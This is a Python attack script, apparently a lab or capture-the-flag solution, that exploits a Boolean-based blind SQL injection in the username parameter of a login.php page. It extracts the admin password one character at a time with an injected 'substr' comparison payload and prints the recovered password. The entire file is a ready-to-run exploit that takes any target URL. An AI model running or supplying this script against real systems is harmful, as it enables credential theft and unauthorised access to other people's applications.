import requests
import string
from urllib.parse import urljoin
import argparse


def exfiltrate_the_admin_password(target_url):
    """
    Exploiting the Boolean-based blind SQLI in the `username` POST parameter
    to exfiltrate the admin's password
    """
    url = urljoin(target_url, "/login.php")
    charset = string.digits + string.ascii_lowercase
    max_length = 32
    extracted_password = ""

    print("[*] Starting password exfiltration against the admin...")

    for i in range(1, max_length + 1):
        found = False
        for char in charset:
            payload = f"admin' AND substr(password,{i},1)='{char}'-- -"
            data = {
                "username": payload,
                "password": "anything"
            }

            try:
                response = requests.post(url, data=data)
                body = response.text

                if "Wrong identification : admin" in body:
                    extracted_password += char
                    print(f"[+] Found char at position {i}: {char}")
                    found = True
                    break

            except requests.RequestException as e:
                print(f"[!] Request failed at position {i} with char '{char}': {e}")
                break

        if not found:
            print(f"[-] No valid character found at position {i}. Stopping.")
            break

    print(f"\n[✓] Extracted password: {extracted_password}")
    return extracted_password

def main():
    parser = argparse.ArgumentParser(description="Exfiltrate the admin's password...")
    parser.add_argument("target", help="Target IP or URL (e.g, http://10.10.1.2)")
    args = parser.parse_args()

    exfiltrate_the_admin_password(args.target)

if __name__ == "__main__":
    main()
